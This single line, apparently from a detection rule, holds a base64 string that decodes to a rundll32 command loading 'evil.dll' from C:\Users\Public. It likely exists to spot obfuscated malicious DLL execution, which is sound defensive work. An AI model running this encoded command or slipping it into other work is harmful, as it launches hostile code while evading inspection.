    rundll32 = "cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAGUAdgBpAGwALgBkAGwAbAAsAEUAbgB0AHIAeQBQAG8AaQBuAHQA"
